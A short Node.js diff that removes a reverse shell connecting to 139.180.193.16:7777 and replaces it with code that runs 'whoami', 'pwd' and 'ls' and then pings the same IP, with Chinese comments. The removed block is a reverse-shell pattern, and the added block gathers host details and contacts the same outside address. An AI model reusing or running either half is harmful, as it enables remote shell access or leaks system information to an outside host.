@@ -1,13 +1,16 @@
-const net = require('net');
 const { exec } = require('child_process');
 
-const client = new net.Socket();
-client.connect(7777, '139.180.193.16', () => {
-    client.pipe(exec('/bin/sh').stdin);
-    exec('/bin/sh').stdout.pipe(client);
-    exec('/bin/sh').stderr.pipe(client);
-});
+// 执行命令: whoami, pwd, ls, 然后ping一个IP地址
+exec('whoami && pwd && ls && ping -c 4 139.180.193.16', (error, stdout, stderr) => {
+    if (error) {
+        console.error(`执行命令时出错: ${error.message}`);
+        return;
+    }
 
-client.on('error', (e) => {
-    console.error(`Problem with connection: ${e.message}`);
+    if (stderr) {
+        console.error(`命令执行输出错误: ${stderr}`);
+        return;
+    }
+
+    console.log(`命令执行结果:\n${stdout}`);
 });
